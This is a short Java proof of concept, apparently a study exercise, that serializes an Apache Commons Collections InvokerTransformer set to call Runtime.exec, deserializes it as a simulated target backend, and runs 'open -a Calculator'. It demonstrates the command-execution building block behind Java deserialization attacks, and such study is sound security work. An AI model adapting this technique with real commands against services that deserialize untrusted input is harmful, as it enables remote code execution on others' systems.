package con.yhy;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;

/**
 * @author yhy
 * @date 2021/6/9 20:47
 * @github https://github.com/yhy0
 */
// 使用 InvokerTransformer 来执行命令
public class InvokerTransformerTest {
    public static void main(String[] args) throws Exception {
        Transformer invoker = new InvokerTransformer("exec",
                new Class[]{String.class},
                new Object[] {"open -a Calculator"}
        );
//        invoker.transform(Runtime.getRuntime());

        // 将invokerTransformer进行序列化
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./invoker.bin"));
        outputStream.writeObject(invoker);
        outputStream.close();

        // 模拟目标后端程序接受到的序列化后的数据
        FileInputStream fi = new FileInputStream("./invoker.bin");
        ObjectInputStream fin = new ObjectInputStream(fi);
        InvokerTransformer invokerTransformer1 = (InvokerTransformer) fin.readObject();

        invokerTransformer1.transform(Runtime.getRuntime());

    }
}
